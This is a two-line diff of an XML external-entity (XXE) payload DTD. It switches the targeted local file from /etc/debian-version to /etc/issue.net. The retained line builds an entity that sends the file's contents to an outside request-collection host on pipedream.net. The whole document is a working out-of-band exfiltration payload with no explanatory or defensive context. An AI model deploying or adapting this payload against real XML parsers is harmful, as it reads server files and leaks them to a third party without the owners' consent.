@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/debian-version">
+<!ENTITY % file SYSTEM "file:///etc/issue.net">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://en6jo2pakap44.x.pipedream.net/?%file;'>">
